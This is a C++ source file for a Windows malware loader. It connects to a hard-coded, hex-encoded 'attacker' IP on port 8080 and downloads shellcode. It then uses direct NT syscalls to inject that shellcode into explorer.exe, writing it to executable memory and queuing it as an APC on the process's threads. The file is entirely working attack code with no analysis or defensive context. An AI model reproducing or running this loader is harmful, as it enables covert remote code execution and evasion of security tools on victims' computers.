#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
#include "SysCalls.h"
#include <stdio.h>
#pragma warning(disable:4996)
//Winsock Library
#pragma comment(lib,"ws2_32.lib")

int main(int argc, char** argv) {
    WSADATA windSockDLL;
    SOCKET socketTCP;
    struct sockaddr_in server;
    char shCode[2048];
    // IP attacker
    char h[] = { 0x32,0x30,0x31,0x2e,0x33,0x37,0x2e,0x31,0x34,0x37,0x2e,0x31,0x33,0x30,0x00 };
    char procces[] = {"explorer.exe"};
    int p = 8080;
    int recv_size;

    printf("Iniciando +1\n");
    if (WSAStartup(MAKEWORD(2, 2), &windSockDLL) != 0) return 1;
    
    if ((socketTCP = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
    }
    printf("addres %s \n",h);

    server.sin_addr.s_addr = inet_addr(h);
    server.sin_family = AF_INET;
    server.sin_port = htons(p);

    if (connect(socketTCP, 
        (struct sockaddr*)&server, 
        sizeof(server)) < 0) return 1;

    if ((recv_size = recv(socketTCP, shCode, 2048, 0)) == SOCKET_ERROR)
        shCode[recv_size];
    printf("[i] Shell code resive // Gatting ");

    LPVOID allocation_start = nullptr;
    SIZE_T allocation_size = sizeof(shCode);
    HANDLE hThread;
    HANDLE hProcess;

    // looking for explorer
    HANDLE processsnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
    DWORD dwProcessId;

    if (Process32First(processsnapshot, &processEntry)) {
        while (_wcsicmp(processEntry.szExeFile, L"explorer.exe") != 0) {
            Process32Next(processsnapshot, &processEntry);
        }
    }
    // Proccees ID
    dwProcessId = processEntry.th32ProcessID;

    OBJECT_ATTRIBUTES pObjectAttributes;
    InitializeObjectAttributes(&pObjectAttributes, NULL, NULL, NULL, NULL);

    CLIENT_ID pClientId;
    pClientId.UniqueProcess = (PVOID)processEntry.th32ProcessID;
    pClientId.UniqueThread = (PVOID)0;

    // Network windows dll
    NtOpenProcess(&hProcess, MAXIMUM_ALLOWED, &pObjectAttributes, &pClientId);
    NtAllocateVirtualMemory(hProcess, &allocation_start, 0,&allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    NtWriteVirtualMemory(hProcess, allocation_start, shCode, sizeof(shCode), 0);


    THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
    std::vector<DWORD> threadIds;
    if (Thread32First(processsnapshot, &threadEntry)) {
        do {
            if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
                threadIds.push_back(threadEntry.th32ThreadID);
            }
        } while (Thread32Next(processsnapshot, &threadEntry));
    }

    int count = 0;
    for (DWORD threadId : threadIds) {

        OBJECT_ATTRIBUTES tObjectAttributes;
        InitializeObjectAttributes(&tObjectAttributes, NULL, NULL, NULL, NULL);

        CLIENT_ID tClientId;
        tClientId.UniqueProcess = (PVOID)dwProcessId;
        tClientId.UniqueThread = (PVOID)threadId;

        NtOpenThread(&hThread, MAXIMUM_ALLOWED, &tObjectAttributes, &tClientId);
        NtSuspendThread(hThread, NULL);
        NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)allocation_start, allocation_start, NULL, NULL);
        NtResumeThread(hThread, NULL);
        count++;

        if (count == 3) {
            break;
        }
    }
    return 0;
}
